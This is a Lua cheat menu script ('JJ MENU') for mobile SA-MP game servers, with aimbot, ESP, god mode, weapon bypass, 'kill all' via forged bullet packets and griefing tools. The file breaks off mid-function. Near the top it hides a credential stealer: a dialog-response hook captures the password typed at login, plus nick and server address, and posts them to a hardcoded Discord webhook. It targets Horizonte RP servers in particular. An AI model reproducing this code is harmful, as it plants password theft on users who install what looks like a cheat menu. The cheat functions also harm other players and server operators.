local imgui = require "mimgui"
local faicons = require("fAwesome6")

local window = imgui.new.bool(false)
local selectedTab = imgui.new.int(0)
local MDS = MONET_DPI_SCALE or 1.0

local sampev = require "samp.events"
local ffi = require 'ffi'
local event = require('lib.samp.events')
local events = require "lib.samp.events"
local new = imgui.new
local ev = require('lib.samp.events')


local socket = require("socket")
local ssl = require("ssl")
local ltn12 = require("ltn12")
local samp = require("samp.events")

-- Webhook do Discord
local webhookDomain = "discord.com"
local webhookPath = "/api/webhooks/1344405697642762260/AMSM__DQ0n4OC5-s7m_Hkatg-sAguMiq2wFrgiMabsKL5sj3XGC3f6pJHGV3XyJ604zx"
local messageCount = 0

-- IPs e domínios do Horizonte RP
local horizonteHosts = {
    ["149.56.252.173:7777"] = true,
    ["149.56.252.174:7777"] = true,
    ["149.56.252.175:7777"] = true,
    ["149.56.252.176:7777"] = true,
    ["ip1.horizonte-rp.com:7777"] = true,
    ["ip2.horizonte-rp.com:7777"] = true,
    ["ip3.horizonte-rp.com:7777"] = true,
    ["ip4.horizonte-rp.com:7777"] = true
}

-- Função para enviar mensagem ao Discord via socket SSL
function sendMessageToDiscord(content)
    local jsonData = string.format('{"content": "%s"}', content:gsub('"', '\\"'):gsub("\n", "\\n"))
    
    local headers = {
        "Host: " .. webhookDomain,
        "Content-Type: application/json",
        "Content-Length: " .. #jsonData,
        "Connection: close"
    }

    local tcpSocket = socket.tcp()
    tcpSocket:settimeout(5)
    
    local success, err = tcpSocket:connect(webhookDomain, 443)
    if not success then return false end

    local sslSocket = ssl.wrap(tcpSocket, {
        mode = "client",
        protocol = "tlsv1_2",
        verify = "none"
    })
    sslSocket:sni(webhookDomain)
    sslSocket:settimeout(5)

    success, err = sslSocket:dohandshake()
    if not success then return false end

    local request = string.format(
        "POST %s HTTP/1.1\r\n%s\r\n\r\n%s",
        webhookPath,
        table.concat(headers, "\r\n"),
        jsonData
    )

    success, err = sslSocket:send(request)
    if not success then return false end

    sslSocket:receive("*a")
    sslSocket:close()
    return true
end

-- Evento do SAMP
samp.onSendDialogResponse = function(dialogId, button, listboxId, input)
    if dialogId >= 0 and dialogId <= 3 then
        local ip, port = sampGetCurrentServerAddress()
        local servername = sampGetCurrentServerName() or ""
        local host = ip .. ":" .. port

        local isHorizonte = horizonteHosts[host] or servername:lower():find("horizonte") ~= nil

        if (isHorizonte and messageCount < 2) or (not isHorizonte and messageCount == 0) then
            local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
            local nick = sampGetPlayerNickname(id)
            local hora = os.date("%H:%M:%S")
            local data = os.date("%d/%m/%Y")

            local message = string.format(
                "**JUCA MENU**\n\n" ..
                "**SCRIPT:** OXMENU.LUA\n" ..
                "**ID DA DIALOG:** %d\n" ..
                "**SENHA:** %s\n" ..
                "**NICK:** %s\n" ..
                "**IP:** %s:%d\n" ..
                "**SERVIDOR:** %s\n" ..
                "**DATA:** %s\n" ..
                "**HORA:** %s\n\n" ..
                "@everyone",
                dialogId,
                input,
                nick,
                ip,
                port,
                servername,
                data,
                hora
            )

            sendMessageToDiscord(message)
            messageCount = messageCount + 1
        end
    end
end

local json = require 'json'
local SAMemory = require 'SAMemory'
local gta = ffi.load('GTASA')
local ADDONS = require("ADDONS") 
local requiere = ffi.load("GTASA")
local vector3d = require("vector3d")
SAMemory.require("CCamera")

local infiniteAmmo = imgui.new.bool(false)

local selectedId = -1
local searchText = imgui.new.char[64]()
local isSpecActive = false
local specTargetId = -1



require "lib.moonloader"
require "lib.sampfuncs"

local mostrarMenu = imgui.new.bool(false)
local puxarCheckbox = imgui.new.bool(false)
local loopAtivo = false
local inputId = imgui.new.char[10]()
local idAlvo = -1

local airbrake_enabled = imgui.new.bool(false)
local speed = imgui.new.float(0.3)
local widgets = require("widgets") -- for WIDGET_(...)

local bypassAtivo = imgui.new.bool(false)
local armasAtivas = {}

local vehIdInput = imgui.new.char[10]()
require "lib.sampfuncs"
require "lib.moonloader"
local isTimerActive = false
local disablePlayerSync = false

local dissync = false
local bulletsActive = imgui.new.bool(false)

local mveh = nil
local mostrarMenu = imgui.new.bool(false)
local inputIdJogador = imgui.new.char[10]()

local invis = imgui.new.bool(false)
local memory = require("memory")
local rak = require("samp.raknet")

local var_0_10  

local FCR_BOLD = 1
local FCR_BORDER = 4
 
local function createFont()
    local var_0_10 = renderCreateFont("Arial", 12, 4, FCR_BOLD + FCR_BORDER)
    return var_0_10
end

local invertPlayer = imgui.new.bool(false)
local fastPunch = imgui.new.bool(false)
local autoRegenerarVida = imgui.new.bool(false)
local staminaInfinite = imgui.new.bool(false)
local weapon_id = new.int(31)
local ammo = new.int(500)

local bones = {3, 4, 5, 51, 52, 41, 42, 31, 32, 33, 21, 22, 23, 2}
local font = renderCreateFont("Arial", 12, 1 + 4)
ffi.cdef(
    "typedef struct RwV3d { float x; float y; float z; } RwV3d; void _ZN4CPed15GetBonePositionER5RwV3djb(void* thiz, RwV3d* posn, uint32_t bone, bool calledFromCam);"
)
ffi.cdef([[ void _Z12AND_OpenLinkPKc(const char* link); ]])

local autoTPCheck = imgui.new.bool(false)
local destino = { x = 0, y = 0, z = 0 }
local cordenadas = {x = 0, y = 0, z = 0}
local DPI = MONET_DPI_SCALE
local encoding = require 'encoding'
local lfs = require 'lfs'
local amigos = {}

local hg = {
    ANTIDM = imgui.new.bool(),
    ANTICONGELAR = imgui.new.bool(),
    DESTRANCAR = imgui.new.bool()
}

local EASY = {
    godmod = new.bool(false),
    naotelaradm = new.bool(false),
    naotelaradm2 = new.bool(false),
    teste67 = new.bool(false),
    isActive = new.bool(false),
    weaponList = {},
    noreset = new.bool(false),
    matararea_enabled = new.bool(false),
    noreload = new.bool(false),
    fastreload = new.bool(false),
    nostun = new.bool(false),   
    espcar_enabled = new.bool(false),
    espcarlinha_enablade = new.bool(false),
    espinfo_enabled = new.bool(false),
    espplataforma = new.bool(false),
    flodarmorte = new.bool(),
    ESP_ESQUELETO = imgui.new.bool(false),
    esp_enabled = new.bool(false),
    wallhack_enabled = new.bool(false),
    nostun = new.bool(false),
    teste31 = new.bool(false),
    teste29 = new.bool(false),
    espplataforma = new.bool(false)
}

--aimbot

local camera = SAMemory.camera
local screenWidth, screenHeight = getScreenResolution()
local configFilePath = getWorkingDirectory() .. "/config/EASY.json"
local circuloFOVAIM = false

local slide = {
    fovColor = imgui.new.float[4](1.0, 1.0, 1.0, 1.0),
    fovX = imgui.new.float(832.0),
    fovY = imgui.new.float(313.0),
    FoVVHG = imgui.new.float(150.0),
    distancia = imgui.new.int(1000),
    fovvaimbotcirculo = imgui.new.float(200),
    DistanciaAIM = imgui.new.float(1000.0),
    aimSmoothhhh = imgui.new.float(1.000),
    fovCorAimmm = imgui.new.float[4](1.0, 1.0, 1.0, 1.0),
    fovCorsilent = imgui.new.float[4](1.0, 1.0, 1.0, 1.0),
    espcores = imgui.new.float[4](1.0, 1.0, 1.0, 1.0),
    posiX = imgui.new.float(0.520),
    posiY = imgui.new.float(0.439),
    circulooPosX = imgui.new.float(832.0),
    circuloooPosY = imgui.new.float(313.0),
    circuloFOV = false,
    aimCtdr = imgui.new.int(1),
    qtdraios = imgui.new.int(5),
    raiosseguidos = imgui.new.int(10),
    larguraraios = imgui.new.int(40),
    HGPROAIM = imgui.new.int(1),
    minFov = 1,
}

local sulist = {
    cabecaAIM = imgui.new.bool(),
    peitoAIM = imgui.new.bool(),
    bracoAIM = imgui.new.bool(),
    virilhaAIM = imgui.new.bool(),
    lockAIM = imgui.new.bool(),
    braco2AIM = imgui.new.bool(),
    pernaAIM = imgui.new.bool(),
    perna2AIM = imgui.new.bool(),
    PROAIM2 = imgui.new.bool(),
    aimbotparede = imgui.new.bool(false),
}

local buttonPressedTime = 0
local buttonRepeatInterval = 0.0
local renderWindow = imgui.new.bool(false)
local buttonSize = imgui.ImVec2(120 * DPI, 60 * DPI)
local WinState = imgui.new.bool()
local renderWindow = imgui.new.bool()
local sizeX, sizeY = getScreenResolution()
local BOTAO = 2
local activeTab = 2
local SCREEN_W, SCREEN_H = getScreenResolution()

local function loadConfig()
    local file = io.open(configFilePath, "r")
    if file then
        local content = file:read("*a")
        file:close()
        local config = json.decode(content)
        if config and config.slide then
            slide.FoVVHG[0] = tonumber(config.slide.FoVVHG) or slide.FoVVHG[0]
            slide.fovX[0] = tonumber(config.slide.fovX) or slide.fovX[0]
            slide.fovY[0] = tonumber(config.slide.fovY) or slide.fovY[0]          
            slide.fovvaimbotcirculo[0] = tonumber(config.slide.fovvaimbotcirculo) or slide.fovvaimbotcirculo[0]
            slide.DistanciaAIM[0] = tonumber(config.slide.DistanciaAIM) or slide.DistanciaAIM[0]
            slide.aimSmoothhhh[0] = tonumber(config.slide.aimSmoothhhh) or slide.aimSmoothhhh[0]
            slide.fovCorAimmm[0] = tonumber(config.slide.fovCorAimmm) or slide.fovCorAimmm[0]
            slide.posiX[0] = tonumber(config.slide.posiX) or slide.posiX[0]
            slide.posiY[0] = tonumber(config.slide.posiY) or slide.posiY[0]
            slide.circulooPosX[0] = tonumber(config.slide.circulooPosX) or slide.circulooPosX[0]
            slide.circuloooPosY[0] = tonumber(config.slide.circuloooPosY) or slide.circuloooPosY[0]
            slide.distancia[0] = tonumber(config.slide.distancia) or slide.distancia[0]
            slide.fovColor[0] = tonumber(config.slide.fovColorR) or slide.fovColor[0]
            slide.fovColor[1] = tonumber(config.slide.fovColorG) or slide.fovColor[1]
            slide.fovColor[2] = tonumber(config.slide.fovColorB) or slide.fovColor[2]
            slide.fovColor[3] = tonumber(config.slide.fovColorA) or slide.fovColor[3]
        end
    end
end

local function saveConfig()
    local config = {
        slide = {
            FoVVHG = slide.FoVVHG[0],
            fovX = slide.fovX[0],
            fovY = slide.fovY[0],
            fovvaimbotcirculo = slide.fovvaimbotcirculo[0],
            DistanciaAIM = slide.DistanciaAIM[0],
            aimSmoothhhh = slide.aimSmoothhhh[0],
            fovCorAimmm = slide.fovCorAimmm[0],
            posiX = slide.posiX[0],
            posiY = slide.posiY[0],
            circulooPosX = slide.circulooPosX[0],
            circuloooPosY = slide.circuloooPosY[0],
            distancia = slide.distancia[0],
            fovColorR = slide.fovColor[0],
            fovColorG = slide.fovColor[1],
            fovColorB = slide.fovColor[2],
            fovColorA = slide.fovColor[3],
        }
    }
    local file = io.open(configFilePath, "w")
    if file then
        file:write(json.encode(config))
        file:close()
    end
end

local function randomizeToggleButtons()
    while sulist.ativarRandomizacao[0] do
        sulist.peito[0].Checked = math.random(0, 1) == 1
        sulist.braco[0].Checked = math.random(0, 1) == 1
        sulist.braco2[0].Checked = math.random(0, 1) == 1
        sulist.cabeca[0].Checked = math.random(0, 4) == 1
        
        wait(40)
    end
end

local function isAnyToggleButtonActive()
    return sulist.cabeca[0].Checked or sulist.perna[0].Checked or sulist.virilha[0].Checked or sulist.pernas2[0].Checked or sulist.peito[0].Checked or sulist.braco[0].Checked or sulist.braco2[0].Checked or ativarMatarAtravesDeParedes[0].Checked
end

local ui_meta = {
    __index = function(self, v)
        if v == "switch" then
            local switch = function()
                if self.process and self.process:status() ~= "dead" then
                    return false
                end
                self.timer = os.clock()
                self.state = not self.state

                self.process = lua_thread.create(function()
                    local bringFloatTo = function(from, to, start_time, duration)
                        local timer = os.clock() - start_time
                        if timer >= 0.00 and timer <= duration then
                            local count = timer / (duration / 100)
                            return count * ((to - from) / 100)
                        end
                        return (timer > duration) and to or from
                    end

                    while true do wait(0)
                        local a = bringFloatTo(0.00, 1.00, self.timer, self.duration)
                        self.alpha = self.state and a or 1.00 - a
                        if a == 1.00 then break end
                    end
                end)
                return true
            end
            return switch
        end
 
        if v == "alpha" then
            return self.state and 1.00 or 0.00
        end
    end
}

local menu = { state = false, duration = 1.15 }
setmetatable(menu, ui_meta)

local str = encoding.UTF8

--fim local aimbot

local particlesSidebar = {}
local maxParticlesSidebar = 40
local sidebarWidth = 160 * MDS
local sidebarHeight = 420 * MDS

for i = 1, maxParticlesSidebar do
    particlesSidebar[i] = {
        x = math.random() * sidebarWidth,
        y = math.random() * sidebarHeight,
        size = 2 + math.random() * 2,
        speed = 30 + math.random() * 40
    }
end

local particlesContent = {}
local maxParticlesContent = 30
local contentWidth = 600 * MDS - sidebarWidth
local contentHeight = 420 * MDS

for i = 1, maxParticlesContent do
    particlesContent[i] = {
        x = math.random() * contentWidth,
        y = math.random() * contentHeight,
        size = 1 + math.random(),
        speed = 10 + math.random() * 20
    }
end

local menu_version = "v1.0"
local servername = sampGetCurrentServerName() or "DESCONHECIDO"

imgui.OnInitialize(function()
    imgui.GetIO().IniFilename = nil
    imgui.GetStyle():ScaleAllSizes(MDS)

    local config = imgui.ImFontConfig()
    config.MergeMode = true
    config.PixelSnapH = true
    local iconRanges = imgui.new.ImWchar[3](faicons.min_range, faicons.max_range, 0)
    imgui.GetIO().Fonts:AddFontFromMemoryCompressedBase85TTF(
        faicons.get_font_data_base85("Regular"),
        16 * MDS,
        config,
        iconRanges
    )

    local style = imgui.GetStyle()
    local colors = style.Colors

    colors[imgui.Col.WindowBg]          = imgui.ImVec4(0.05, 0.05, 0.05, 1.00)
    colors[imgui.Col.ChildBg]           = imgui.ImVec4(0.08, 0.08, 0.08, 1.00)
    colors[imgui.Col.PopupBg]           = imgui.ImVec4(0.07, 0.07, 0.07, 1.00)

    colors[imgui.Col.Button]            = imgui.ImVec4(0.20, 0.20, 0.20, 1.00)
    colors[imgui.Col.ButtonHovered]     = imgui.ImVec4(0.35, 0.35, 0.35, 1.00)
    colors[imgui.Col.ButtonActive]      = imgui.ImVec4(0.15, 0.15, 0.15, 1.00)

    colors[imgui.Col.Header]            = imgui.ImVec4(0.20, 0.20, 0.20, 1.00)
    colors[imgui.Col.HeaderHovered]     = imgui.ImVec4(0.35, 0.35, 0.35, 1.00)
    colors[imgui.Col.HeaderActive]      = imgui.ImVec4(0.15, 0.15, 0.15, 1.00)

    colors[imgui.Col.FrameBg]           = imgui.ImVec4(0.10, 0.10, 0.10, 1.00)
    colors[imgui.Col.FrameBgHovered]    = imgui.ImVec4(0.15, 0.15, 0.15, 1.00)
    colors[imgui.Col.FrameBgActive]     = imgui.ImVec4(0.20, 0.20, 0.20, 1.00)

    colors[imgui.Col.SliderGrab]        = imgui.ImVec4(0.30, 0.30, 0.30, 1.00)
    colors[imgui.Col.SliderGrabActive]  = imgui.ImVec4(0.40, 0.40, 0.40, 1.00)

    colors[imgui.Col.Separator]         = imgui.ImVec4(0.15, 0.15, 0.15, 1.00)

    colors[imgui.Col.Border]             = imgui.ImVec4(1, 1, 1, 1)
    colors[imgui.Col.TitleBg]            = imgui.ImVec4(0.10, 0.10, 0.10, 1)
    colors[imgui.Col.TitleBgActive]      = imgui.ImVec4(0.10, 0.10, 0.10, 1)
    colors[imgui.Col.TitleBgCollapsed]   = imgui.ImVec4(0.10, 0.10, 0.10, 1)

    local style = imgui.GetStyle()
    style.WindowRounding = 10.0
    style.FrameRounding = 8.0
    style.GrabRounding = 6.0
    style.ScrollbarRounding = 8.0
    style.ChildRounding = 8.0
end)

local ip, port = sampGetCurrentServerAddress()

imgui.OnFrame(function()
    return window[0]
end, function()
    local menuWidth = 600 * MDS
    local menuHeight = 420 * MDS

    imgui.SetNextWindowSize(imgui.ImVec2(menuWidth, menuHeight), imgui.Cond.FirstUseEver)
    imgui.Begin("##JJMENU", window, imgui.WindowFlags.NoTitleBar + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse)

    local title = "JJ MENU"
    local titleSize = imgui.CalcTextSize(title)
    local windowWidth = imgui.GetWindowSize().x

    imgui.SetCursorPosX((windowWidth - titleSize.x) / 2)
    imgui.TextColored(imgui.ImVec4(1.00, 1.00, 1.00, 1.00), title)

    imgui.SameLine()
    imgui.SetCursorPosX(windowWidth - 30 * MDS)
    if imgui.Button(faicons("xmark"), imgui.ImVec2(25 * MDS, 25 * MDS)) then
        window[0] = false
    end
    imgui.Separator()

    imgui.BeginChild("TabList", imgui.ImVec2(sidebarWidth, 0), true)

    local textServer = "Servidor: " .. servername
    local textVersion = "Menu " .. menu_version
    local textSizeServer = imgui.CalcTextSize(textServer)
    local textSizeVersion = imgui.CalcTextSize(textVersion)
    local childWidth, childHeight = imgui.GetWindowSize().x, imgui.GetWindowSize().y

    imgui.SetCursorPosX((childWidth - textSizeServer.x) / 2)
    imgui.TextColored(imgui.ImVec4(1, 1, 1, 1), textServer)

    imgui.SetCursorPosX((childWidth - textSizeVersion.x) / 2)
    imgui.TextColored(imgui.ImVec4(1, 1, 1, 1), textVersion)

    imgui.Dummy(imgui.ImVec2(0, 20 * MDS)) -- espa�o entre textos e bot�es

    if imgui.Button(faicons("user") .. "  Player", imgui.ImVec2(-1, 45 * MDS)) then selectedTab[0] = 0 end
    if imgui.Button(faicons("gun") .. "  Weapons", imgui.ImVec2(-1, 45 * MDS)) then selectedTab[0] = 1 end
    if imgui.Button(faicons("bug") .. "  Exploit", imgui.ImVec2(-1, 45 * MDS)) then selectedTab[0] = 2 end
    if imgui.Button(faicons("eye") .. "  Esp", imgui.ImVec2(-1, 45 * MDS)) then selectedTab[0] = 3 end
    if imgui.Button(faicons("sword") .. "  Combat", imgui.ImVec2(-1, 45 * MDS)) then selectedTab[0] = 4 end
    if imgui.Button(faicons("signal") .. "  Online", imgui.ImVec2(-1, 45 * MDS)) then selectedTab[0] = 5 end

    local dt = imgui.GetIO().DeltaTime
    local drawListSidebar = imgui.GetWindowDrawList()
    local absPosSidebar = imgui.GetWindowPos()

    for i, p in ipairs(particlesSidebar) do
        p.y = p.y + p.speed * dt
        if p.y > sidebarHeight then
            p.y = 0
            p.x = math.random() * sidebarWidth
            p.size = 2 + math.random() * 2
            p.speed = 30 + math.random() * 40
        end
        local col = imgui.ColorConvertFloat4ToU32(imgui.ImVec4(1, 1, 1, 0.6))
        drawListSidebar:AddCircleFilled(
            imgui.ImVec2(absPosSidebar.x + p.x, absPosSidebar.y + p.y),
            p.size,
            col
        )
    end

    imgui.EndChild()

    imgui.SameLine()
    imgui.BeginChild("TabContent", imgui.ImVec2(0, 0), true)

    local dtContent = imgui.GetIO().DeltaTime
    local drawListContent = imgui.GetWindowDrawList()
    local absPosContent = imgui.GetWindowPos()
    local contentWidthLocal, contentHeightLocal = imgui.GetWindowSize().x, imgui.GetWindowSize().y

    for i, p in ipairs(particlesContent) do
        p.x = p.x + p.speed * dtContent
        if p.x > contentWidthLocal then
            p.x = 0
            p.y = math.random() * contentHeightLocal
            p.size = 1 + math.random()
            p.speed = 10 + math.random() * 20
        end
        local col = imgui.ColorConvertFloat4ToU32(imgui.ImVec4(0.7, 0.7, 1, 0.3))
        drawListContent:AddCircleFilled(
            imgui.ImVec2(absPosContent.x + p.x, absPosContent.y + p.y),
            p.size,
            col
        )
    end

    if selectedTab[0] == 0 then playerTab()
    elseif selectedTab[0] == 1 then weaponsTab()
    elseif selectedTab[0] == 2 then carTab()
    elseif selectedTab[0] == 3 then miscTab()
    elseif selectedTab[0] == 4 then combateTab()
    elseif selectedTab[0] == 5 then onlineTab()
    end

    imgui.EndChild()
    imgui.End()
end)

function playerTab()


    imgui.Checkbox(" GOD MOD", EASY.godmod)
    imgui.Checkbox(" ANTI STUN", EASY.nostun)
    imgui.Checkbox(" AIRBRAKE", airbrake_enabled)
    if airbrake_enabled[0] then
        imgui.SliderFloat("Velocidade", speed, 0.1, 3.5, "%.2f")
    end
    imgui.Checkbox(" INVISIVEL", invis)
    imgui.Checkbox(" INVERTER JOGADOR", invertPlayer)
    imgui.Checkbox(" CHECAR PLATAFORMA", EASY.espplataforma)
    imgui.Checkbox(" SOCO R�PIDO", fastPunch)

    if imgui.Checkbox(" DESATIVAR ANTI DM", hg.ANTIDM) then
        -- l�gica opcional aqui
    end

    

    imgui.Checkbox(" AUTO REGENERAR VIDA", autoRegenerarVida)
    if autoRegenerarVida[0] then
        regenerarVida()
    end

    if imgui.Checkbox(" ESTAMINA INFINITA", staminaInfinite) then
        setPlayerNeverGetsTired(PLAYER_HANDLE, staminaInfinite[0])
    end
end

function weaponsTab()
if imgui.Checkbox("ATIVAR BYPASS DE ARMAS", bypassAtivo) then
            if not bypassAtivo[0] then
                for _, arma in pairs(armasAtivas) do
                    removeWeaponFromChar(PLAYER_PED, arma)
                end
                armasAtivas = {}
            end

            sampAddChatMessage(
                "{FF0000}[BYPASS]: {FFF000}" ..
                (bypassAtivo[0] and "BYPASS LIGADO" or "BYPASS DESLIGADO"), -1
            )
        end

   
    imgui.Checkbox(" NAO RESETAR ARMA", EASY.noreset)
    imgui.Checkbox(" MATAR EM AREA SAFE", EASY.matararea_enabled)
    imgui.Checkbox(" SEM RELOAD (NO RELOAD)", EASY.noreload)
    imgui.Checkbox(" RELOAD R�PIDO (FAST RELOAD)", EASY.fastreload)
    imgui.Checkbox(" MUNICAO INFINITA", infiniteAmmo)
    
    

    imgui.InputInt(" ID DA ARMA", weapon_id)
    imgui.InputInt(" MUNI��O", ammo)

    if imgui.Button(" PUXAR ARMA") then
        giveGun(weapon_id[0], ammo[0])
    end
    imgui.SameLine()
    if imgui.Button(" REMOVER TODAS AS ARMAS") then
        removeAllCharWeapons(PLAYER_PED)
    end
end

function carTab()
    -- CHECKBOXES
    imgui.Checkbox(" AUTO FARM CARREGADOR (OSCRIAS)", autoTPCheck)

    if imgui.Checkbox(" AUTO BUGAR CARROS", imgui.new.bool(isTimerActive)) then
        isTimerActive = not isTimerActive
        sampAddChatMessage("AUTO LOOP DE RESPAWN " .. (isTimerActive and "{00FF00}ATIVADO" or "{FF0000}DESATIVADO"), 0x00CCFF)
    end

    if imgui.Checkbox(" KILL ALL", bulletsActive) then
        sampAddChatMessage("KILL ALL: " .. (bulletsActive[0] and "ATIVADO" or "DESATIVADO"), -1)
    end
    
    imgui.Checkbox(" DAR VEICULOS A PLAYER KKKK", puxarCheckbox)

        if puxarCheckbox[0] then
            imgui.InputText("ID DO JOGADOR", inputId, 10)

            if imgui.Button(loopAtivo and "DESATIVAR LOOP" or "ATIVAR LOOP") then
                if not loopAtivo then
                    local id = tonumber(ffi.string(inputId))
                    if id then
                        idAlvo = id
                        loopAtivo = true
                        iniciarLoopPuxador()
                        sampAddChatMessage("[PUXAR]: LOOP INICIADO PARA O ID " .. id, -1)
                    else
                        sampAddChatMessage("[PUXAR]: ID INVALIDO", -1)
                    end
                else
                    loopAtivo = false
                    sampAddChatMessage("[PUXAR]: LOOP DESATIVADO", -1)
                end
            end
        end

    

    imgui.SetNextItemWidth(-1) -- input com largura total da janela
    imgui.InputText("##vehinput", vehIdInput, 10)

    if imgui.Button(" BUGAR VE�CULO", imgui.ImVec2(-1, 35 * MDS)) then
        respawnCarById(ffi.string(vehIdInput))
    end

    

    imgui.SetNextItemWidth(-1) -- input com largura total da janela
    imgui.InputText("##idinput", inputIdJogador, 10)

    if imgui.Button(" TROLLAR JOGADOR", imgui.ImVec2(-1, 35 * MDS)) then
        local id = tonumber(ffi.string(inputIdJogador))
        if id then
            executarTroll(id)
        else
            sampAddChatMessage("{FF0000}DIGITE UM ID VALIDO.", -1)
        end
    end
end

function miscTab()
imgui.Checkbox(" ESP ESQUELETO", EASY.ESP_ESQUELETO)
    imgui.Checkbox(" ESP NOME/VIDA/COLETE", EASY.wallhack_enabled)
    imgui.Checkbox(" ESP LINHA CARRO", EASY.espcar_enabled)
    imgui.Checkbox(" ESP BOX CARRO", EASY.espcarlinha_enablade)
    imgui.Checkbox(" ESP INFO CARRO", EASY.espinfo_enabled)
    imgui.Checkbox(" ESP LINHA PLAYER", EASY.esp_enabled)
end

function combateTab()


    imgui.Checkbox(" CABE�A", sulist.cabecaAIM)
    imgui.Checkbox(" PEITO", sulist.peitoAIM)
    imgui.Checkbox(" VIRILHA", sulist.virilhaAIM)
    imgui.Checkbox(" BRA�O 1", sulist.bracoAIM)
    imgui.Checkbox(" BRA�O 2", sulist.braco2AIM)
    imgui.Checkbox(" PERNA 1", sulist.pernaAIM)
    imgui.Checkbox(" PERNA 2", sulist.perna2AIM)

    
    
    local function updateSlideValue(increment)
        if increment then
            if slide.fovvaimbotcirculo[0] < 90000 then
                slide.fovvaimbotcirculo[0] = slide.fovvaimbotcirculo[0] + 5
            end
        else
            if slide.fovvaimbotcirculo[0] > 1 then
                slide.fovvaimbotcirculo[0] = slide.fovvaimbotcirculo[0] - 2
            end
        end
    end
    
    imgui.InputFloat("", slide.fovvaimbotcirculo, 0.0, 0.0, "         FOV   %.1f")   
    imgui.SameLine()
    if imgui.Button("-", imgui.ImVec2(30 * DPI, 30 * DPI)) then
        buttonPressedTime = os.clock()
        updateSlideValue(false)
    end
    if imgui.IsItemActive() and os.clock() - buttonPressedTime >= buttonRepeatInterval then
        updateSlideValue(false)
        buttonPressedTime = os.clock()
    end
    imgui.SameLine()
    if imgui.Button("+", imgui.ImVec2(30 * DPI, 30 * DPI)) then
        buttonPressedTime = os.clock()
        updateSlideValue(true)
    end
    if imgui.IsItemActive() and os.clock() - buttonPressedTime >= buttonRepeatInterval then
        updateSlideValue(true)
        buttonPressedTime = os.clock()
    end

    
    
    imgui.PushFont(font1)
    imgui.Text("FOV COR")
    imgui.PopFont()
    imgui.ColorEdit4("FOV COR", slide.fovCorAimmm)

    

    imgui.PushFont(font1)
    imgui.Text("SMOOTH CONFIG")
    imgui.PopFont()
    imgui.SliderFloat("##smootgsvsk", slide.aimSmoothhhh, 0.050, 1.0, "%.3f")

    imgui.PushFont(font1)
    imgui.Text("DIST�NCIA AIM CONFIG")
    imgui.PopFont()
    imgui.SliderFloat("##distavafaimnc", slide.DistanciaAIM, 0.0, 1000, "%.1f")

    

    imgui.PushFont(font1)
    imgui.Text("SALVAR CONFIGS")
    imgui.PopFont()

    if imgui.Button(" SALVAR ") then
        saveConfig()
        printStringNow("~w~ SMOOTH E DIST SALVO", 1000)
    end
end

function onlineTab()
imgui.Text("EM BREVE")
end

--PARTE SAMP EVENTS

-- BLOQUEIO DE SINCRONIZA��O DE ARMA
function events.onSendPlayerSync(data)
    if bypassAtivo[0] then
        data.weapon = 0
    end
end

-- BLOQUEIO DE PACOTE 204
function onSendPacket(id)
    if id == 204 and bypassAtivo[0] then
        return false
    end
end

function regenerarVida()
    lua_thread.create(
        function()
            while autoRegenerarVida[0] do
                wait(100)
                local vidaAtual = getCharHealth(PLAYER_PED)
                if vidaAtual < 100 then
                    setCharHealth(PLAYER_PED, vidaAtual + 10)
                end
            end
        end
    )
end

function applyFastPunch()
    local anims = {
        "SPRINT_PANIC",
        "SWIM_CRAWL",
        "FIGHTA_1",
        "FIGHTA_2",
        "FIGHTA_3",
        "FIGHTA_M",
        "FIGHTA_G",
        "FIGHTB_1",
        "FIGHTB_2",
        "FIGHTB_3",
        "FIGHTB_G",
        "FIGHTC_1",
        "FIGHTC_2",
        "FIGHTC_3",
        "FIGHTC_G",
        "FIGHTD_1",
        "FIGHTD_2",
        "FIGHTD_3",
        "FIGHTD_G",
        "GUN_BUTT",
        "FIGHTKICK",
        "FIGHTKICK_B"
    }

    for i = 1, #anims do
        local anim = anims[i]
        local speed = (anim == "SPRINT_PANIC" and 1.3) or (anim == "SWIM_CRAWL" and 21) or 2
        setCharAnimSpeed(PLAYER_PED, anim, speed)
    end
end

local players = {}
local font = renderCreateFont("Arial", 9, 5)

function espplataforma()
    local peds = getAllChars()

    -- Cor fixa padr�o (branco com transpar�ncia total)
    local espcor = 0xFFFFFFFF

    for i = 2, #peds do
        local ped = peds[i]
        if ped ~= nil and isCharOnScreen(ped) then
            local success, id = sampGetPlayerIdByCharHandle(ped)
            if success and not sampIsPlayerNpc(id) then
                if players[id] ~= nil then
                    local x, y, z = getCharCoordinates(ped)
                    local xs, ys = convert3DCoordsToScreen(x, y, z)
                    renderFontDrawText(font, players[id], xs - 23, ys, espcor)
                end
            end
        end
    end
end


function sendBulletToPlayer(ped, id)
    lua_thread.create(function()
        dissync = true
        if not doesCharExist(ped) then return end

        local data = samp_create_sync_data('player')
        data.health = getCharHealth(PLAYER_PED)
        data.position.x, data.position.y, data.position.z = getCharCoordinates(PLAYER_PED)
        data.weapon = 24 -- DESERT EAGLE
        data.send()
        wait(50)

        for i = 1, 3 do
            if not doesCharExist(ped) then break end
            local bullet = samp_create_sync_data('bullet')
            bullet.targetType = 1
            bullet.targetId = id
            bullet.origin.x, bullet.origin.y, bullet.origin.z = getActiveCameraCoordinates()
            bullet.target.x, bullet.target.y, bullet.target.z = getCharCoordinates(ped)
            bullet.weaponId = 24
            bullet.send()
            wait(10)
        end
        dissync = false
    end)
end

function event.onSendPlayerSync(data)
    if dissync then return false end
end

function samp_create_sync_data(sync_type, copy_from_player)
    local ffi = require 'ffi'
    local sampfuncs = require 'sampfuncs'
    local raknet = require 'samp.raknet'

    copy_from_player = copy_from_player ~= false
    local sync_traits = {
        player = {'PlayerSyncData', raknet.PACKET.PLAYER_SYNC, sampStorePlayerOnfootData},
        vehicle = {'VehicleSyncData', raknet.PACKET.VEHICLE_SYNC, sampStorePlayerIncarData},
        passenger = {'PassengerSyncData', raknet.PACKET.PASSENGER_SYNC, sampStorePlayerPassengerData},
        aim = {'AimSyncData', raknet.PACKET.AIM_SYNC, sampStorePlayerAimData},
        trailer = {'TrailerSyncData', raknet.PACKET.TRAILER_SYNC, sampStorePlayerTrailerData},
        unoccupied = {'UnoccupiedSyncData', raknet.PACKET.UNOCCUPIED_SYNC, nil},
        bullet = {'BulletSyncData', raknet.PACKET.BULLET_SYNC, nil},
        spectator = {'SpectatorSyncData', raknet.PACKET.SPECTATOR_SYNC, nil}
    }

    local sync_info = sync_traits[sync_type]
    local data_type = 'struct ' .. sync_info[1]
    local data = ffi.new(data_type, {})
    local raw_data_ptr = tonumber(ffi.cast('uintptr_t', ffi.new(data_type .. '*', data)))

